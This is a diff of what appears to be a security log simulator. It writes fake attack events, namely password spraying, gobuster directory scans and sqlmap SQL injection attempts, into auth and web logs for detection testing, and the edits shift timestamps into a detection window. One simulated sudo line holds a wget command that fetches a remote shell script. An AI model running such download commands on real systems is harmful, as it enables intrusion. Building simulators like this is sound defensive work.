@@ -132,20 +132,20 @@ def attack_activity(attack_start):
     auth.append((a, sudo_cmd(a, "backup", "/usr/bin/wget http://203.0.113.45/x.sh -O /tmp/x.sh")))
 
     # 3. Password spray: many usernames, few tries each, from one IP
-    s = attack_start + timedelta(minutes=10)
+    s = attack_start + timedelta(minutes=2)
     for user in SPRAY_USERS:
         s += timedelta(seconds=random.randint(5, 15))
         auth.append((s, ssh_fail(s, user, ATTACKER_IPS[1], invalid=True)))
 
     # 5. Directory scanning
-    w = attack_start + timedelta(minutes=5)
+    w = attack_start + timedelta(minutes=1)
     scanner_ua = "gobuster/3.6"
     for path in SCAN_PATHS * 3:
         w += timedelta(milliseconds=random.randint(100, 600))
         web.append((w, web_hit(w, ATTACKER_IPS[2], path, random.choice([404, 404, 404, 403]), scanner_ua, 0)))
 
     # 6. SQL injection attempts
-    w += timedelta(minutes=2)
+    w += timedelta(minutes=1)
     for payload in SQLI_PAYLOADS:
         w += timedelta(seconds=random.randint(2, 8))
         web.append((w, web_hit(w, ATTACKER_IPS[2], f"/products?{payload}", random.choice([200, 500]), "sqlmap/1.8")))
@@ -181,7 +181,9 @@ def main():
     os.makedirs(LOG_DIR, exist_ok=True)
 
     if args.attack_now:
-        auth, web = build_batch(datetime.now(), normal_count=50, attack_at=datetime.now() - timedelta(minutes=3))
+        # Start 6 minutes ago so every event is in the past and inside a 15-minute detection window
+        now = datetime.now()
+        auth, web = build_batch(now - timedelta(minutes=6), normal_count=50, attack_at=now - timedelta(minutes=6))
         write(auth, AUTH_LOG)
         write(web, WEB_LOG)
         print(f"Attack scenarios written with current timestamps ({len(auth)} auth, {len(web)} web events).")
